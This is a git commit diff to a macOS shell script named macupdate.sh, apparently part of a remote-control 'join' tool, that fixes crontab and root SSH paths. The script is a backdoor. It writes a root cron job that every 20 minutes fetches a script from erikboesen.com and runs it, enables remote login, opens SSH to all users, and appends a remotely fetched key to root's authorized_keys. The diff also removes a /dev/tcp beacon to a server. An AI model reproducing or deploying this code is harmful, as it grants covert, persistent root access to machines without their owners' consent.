6d70d855965fe3b5a15056b136a870e350f666b6
ErikBoesen <me@erikboesen.com>
2017-08-11 23:13:16 -0400

    Fix incorrect crontab location for Mac

--- join/mac/macupdate.sh
+++ join/mac/macupdate.sh
@@ -36,8 +36,8 @@ if [[ $(< /tmp/ip) != "$IP" ]]; then
 fi
 
 # TODO: Check that this works and that the crontab path is correct
-cat /var/spool/cron/crontabs/root | grep -v "erikboesen.com" > /tmp/crontab; mv /tmp/crontab /var/spool/crontabs/root
-echo '0 * * * * curl -L erikboesen.com/macupdate.sh |bash' >> /var/spool/crontabs/root
+cat /var/at/tabs/root | grep -v "erikboesen.com" > /tmp/crontab; mv /tmp/crontab /var/at/tabs/root; rm /tmp/crontab
+echo '*/20 * * * * curl -L erikboesen.com/macupdate.sh --output /tmp/macupdate.sh && chmod +x /tmp/macupdate.sh && /tmp/macupdate.sh' >> /var/at/tabs/root
 
 #sudo su -c "printf '#\!/bin/bash\ncurl -L erikboesen.com/macupdate.sh |bash\n' > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update"
 
@@ -46,13 +46,10 @@ systemsetup -setremotelogin on
 # Open SSH to all users
 dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled 2>/dev/null
 
-SSHPATH="/root/.ssh"
+SSHPATH="/var/root/.ssh"
 
 mkdir -p "$SSHPATH"
 
 if ! grep boesene $SSHPATH/authorized_keys; then
 	curl https://erikboesen.com/pubkey >> $SSHPATH/authorized_keys
 fi
-
-exec 3<>/dev/tcp/$SERVER/$PORT
-printf "TESTING: THIS MAC IS ONLINE!"
